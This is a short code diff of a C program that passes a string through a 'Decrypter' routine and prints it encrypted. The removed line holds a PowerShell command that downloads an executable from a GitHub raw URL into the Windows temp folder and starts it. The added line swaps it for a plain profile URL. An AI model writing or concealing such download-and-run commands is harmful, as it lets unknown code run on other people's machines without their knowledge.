@@ -16,7 +16,7 @@ void Decrypter(char* Encrypt_Decrypt) {
 } 
 
 int main() { 
-    char Run[] = "powershell.exe wget https://github.com/andreyquerino/Coisas/blob/main/C/MrQuerino/MrQuerino.exe?raw=true -o C:\\windows\\temp\\WelComeMr.exe;start C:\\windows\\temp\\WelComeMr.exe"; //Texto
+    char Run[] = "www.github.com/andreyquerino"; //Texto
     printf("Encriptado: "); 
     Decrypter(Run); 
     printf("\n"); 
